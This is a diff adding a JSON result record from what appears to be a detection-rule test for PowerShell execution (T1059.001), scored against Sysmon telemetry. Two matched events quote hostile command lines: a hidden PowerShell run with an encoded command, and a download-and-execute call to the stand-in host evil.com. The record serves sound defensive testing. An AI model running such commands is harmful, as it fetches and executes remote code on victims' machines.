@@ -1,0 +1,26 @@
+{
+  "rule_file": "data/rules/T1059.001_a2b3c4d5e6f7890123456789abcdef0123.yml",
+  "technique_id": "T1059.001",
+  "test_guid": "a2b3c4d5e6f7890123456789abcdef0123",
+  "telemetry_file": "data/telemetry/b2c3d4e5/sysmon_b2c3d4e5.evtx",
+  "total_events": 12,
+  "matched_events": 10,
+  "match_details": [
+    {
+      "timestamp": "2026-10-06T10:10:00.000Z",
+      "event_id": "1",
+      "event_type": "process_create",
+      "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand AQAAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsAIABTAHQAYQByAHQALQBTA..."
+    },
+    {
+      "timestamp": "2026-10-06T10:10:01.000Z",
+      "event_id": "1",
+      "event_type": "process_create",
+      "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\""
+    }
+  ],
+  "detection_rate": 0.833,
+  "passed": true
+}
